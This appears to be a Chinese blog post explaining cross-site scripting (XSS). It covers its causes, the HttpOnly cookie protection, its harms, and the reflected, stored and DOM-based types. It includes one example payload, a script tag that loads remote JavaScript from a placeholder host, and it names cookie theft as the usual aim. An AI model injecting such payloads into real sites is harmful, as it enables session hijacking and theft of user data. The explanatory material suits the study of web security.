背景

跨站脚本攻击(Cross Site Scripting)，为不和 层叠样式表（Cascading Style Sheets, CSS）的缩 写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者 往web页面里插入恶意Script代码，当用户浏览该页 时，嵌入WEB页面里的Script代码会被执行，从而达 到恶意攻击用户的目的。

原因

我们访问的网页提供可输入信息的表单，会把我们输入的信息输出到网页上，通常我们输入的信息是一个字符串，恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了，攻击者就可以趁机展开攻击。或者，加载一个远程恶意的js文件，获取查看了这个网页用户的相关信息。

跨站脚本攻击 :主角是脚本

大多数XSS攻击都是采用嵌入一段远程或者第三方域的脚本资源。but why？其实“跨”是浏览器的特性，浏览器允许加载第三方资源。而一般xss攻击时需要输入的东西是比较多的，并不是毫无意义地弹出框框，所以攻击的代码都是<script src="http://xxx.com/a.js"></script>，把具体攻击代码放到脚本里。所以称作跨站脚本攻击。

XSS的场景

XSS的场景很重要，一般情况下XSS可以在用户（访问了被插入XSS的页面）的浏览器上执行js脚本。常见的攻击方式主要是利用XSS盗取用户未受httponly保护的cookie。盗取cookie以后登陆服务器进行操作。

那httponly是啥？ cookie的httponly属性使浏览器不要在除HTTP和HTTPS请求之外暴露cookie。如果cookie有了httponly属性，则我们不能通过非HTTP的方式来访问，例如通过通过调用js（调用document.cookie）,所以不能通过跨域脚本来盗走cookie。facebook和google目前广泛使用httponly。

XSS 危害

  1. 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
  2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
  3. XSS worm
  4. 网站挂马
  5. 有局限性的键盘记录
  6. 劫持浏览器会话，从而执行任意操作，如进行非法转账、强制发表日 志、发送电子邮件等
  7. 强制弹出广告页面，刷流量
  8. 控制受害者机器向其它网站发起攻击
  9. XSS钓鱼
  10. ………………

    关于同源策略

    XSS跟同源策略高度相关，我会在另一篇博客详细记录。

    XSS分类

    反射型XSS

    反射型XSS就是简单地把用户输入地数据反射给浏览器。发出请求时，XSS攻击代码出现在URL中，作为输入内容提交到服务器，服务器解析后响应，在响应内容中出现这段代码，最后浏览器解析执行。
    往往需要用户“点击”一个恶意链接，才能攻击成功。故也叫做“非持久型XSS”。

反射型XSS一般出现在网站地search（搜索）部分，如果网站没有对输入内容做过滤或者限制，就会出现反射型XSS。但这种XSS攻击往往是短暂的，只是伴随参数的传递而生效，再次刷新页面参数值会消失，需要重复提交攻击代码。

主要是因为页面接收到用户输入的消息时，不加判断直接回显在页面。

    存储型XSS

    存储型XSS会把用户输入的数据“存储”在服务器端（可能是数据库/内存/文件系统等）。这种XSS具有很强的稳定性。下次请求目标页面时不用再提交XSS代码。

很典型地例子就是留言的时候，提交一个包含XSS代码地留言，这句留言被储存到数据库中，目标用户查看留言板时，所有的留言内容都会从数据库中查询出来显示在页面上，这时，带有XSS攻击代码的留言被当作正常的html和js来解析，于是触发了XSS攻击。

还有的黑客写下一篇带有恶意js代码的博客文章，文章发表后，所有访问该博客的用户都会在他们的浏览器中执行这段恶意js代码。这个恶意的脚本是黑客保存在服务器端的。

这样的XSS之所以难被发现，是因为很少有网站管理员会定期审计源代码以及数据库。

所以存储型XSS也叫持久型XSS。

存储型XSS攻击最为隐蔽

利用方式

  1. 钓鱼：在页面内插入一段html或js代码进行钓鱼（比如编写一个跟访问的页面极为相似的页面，让用户误以为这是安全的页面）
  2. 重定向：强制跳转至某个页面（刷访问量）
  3. 劫持会话：获取用户的cookie
  4. ……

    处理方法

    其实都是因为过于信任用户信任的输入内容。处理方法同反射型一样。

    DOM XSS

    DOM XSS并非按照”数据是否保存在服务器端”来划分。触发靠浏览器端的DOM解析，是客户端的事。从效果上来说是属于反射型XSS，但是因为DOM XSS 形成原因比较特别，故单独划出来。

    何为DOM？

    DOM是Document Object Model（文档对象模型）的缩写， 它是HTML和XML文档的编程接口，它提供了对文档的结构化表 述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变 文档的结构，样式，和内容。DOM将文档解析为一个由节点和对象 （包含属性和方法的对象）组成的结构集合。简言之，它会将web 页面和脚本或程序语言连接起来。

DOM XSS主要是由客户端的脚本通过动态地输出数据到页面而不是 依赖于将数据提交给服务器端，而从客户端获得DOM中的数据，在本地 执行。通过js操作数据写入网页。
